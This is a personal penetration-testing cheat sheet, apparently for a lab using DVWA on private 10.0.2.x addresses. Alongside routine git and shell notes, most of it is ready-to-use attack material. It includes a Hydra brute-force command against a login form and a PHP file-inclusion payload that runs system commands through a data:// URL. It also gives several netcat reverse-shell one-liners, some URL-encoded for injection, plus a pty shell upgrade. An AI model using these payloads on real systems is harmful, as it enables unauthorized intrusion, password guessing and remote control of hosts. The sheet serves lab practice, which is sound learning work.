# Cheatsheet 

## Sending And Receiving Files With Netcat

###Sending
`nc DESTINATIONSERVER PORT < FILENAME`

###Recieving
`nc -l -p PORT > FILE`


## Change The Time

`date -s "DD MMM YYYY HH:MM:SS"`


## GIT

```bash
git init in your desired directory
git add (your file)
git commit -m (your message)
git push
```

## Hydra Basic Stuff

```bash
hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```
-l indicates a single username (use -L for a username list)  
-P indicates use the following password list  
http-post-form indicates the type of form  
/dvwa/login-php is the login page URL  
username is the form field where the username is entered  
^USER^ tells Hydra to use the username or list in the field  
password is the form field where the password is entered (it may be passwd, pass, etc.)  
^PASS^ tells Hydra to use the password list supplied  
Login indicates to Hydra the login failed message  
Login failed is the login failure message that the form returned
-V is for verbose output showing every attempt

## PHP
http://10.0.2.100/vulnerabilities/fi/?COMMAND=ls&page=data://text/plain,%3C?php%20system($_GET[%27COMMAND%27]);%20?%3E


##NC Reverse Shell

###Terminal
`nc -lvvvnp 4444`

###Target
`nc <your IP> 4444 –e /bin/bash`

http://10.0.2.100/vulnerabilities/fi/?page=data://text/plain,<?php system('TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>%261 | nc ${TARGET} ${PORT} >${PIPE}'); ?>

10.0.2.4:8380/index.php?page=data://text/plain,<?php system('TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>%261 | nc ${TARGET} ${PORT} >${PIPE}'); ?>


rm /tmp/fifo.tmp; mkfifo /tmp/fifo.tmp; cat /tmp/fifo.tmp | sh -i 2>&1 | nc 10.0.2.15 1337 >/tmp/fifo.tmp


TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>&1 | nc ${TARGET} ${PORT} >${PIPE}

- Note 2 self: URL encode ampersand `&` naar `%26` ivm url betekenis!
http://10.0.2.100/vulnerabilities/fi/?page=data://text/plain,<?php system('TARGET=10.0.2.15; PORT=1337; PIPE=/tmp/fifo.tmp; rm ${PIPE}; mkfifo ${PIPE}; cat ${PIPE} | sh -i 2>%261 | nc ${TARGET} ${PORT} >${PIPE}'); ?>


##BASH STUFFS
ls -all
find <desireddirectory> | grep <filename>

##Propper shell
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python3 /tmp/asdf.py

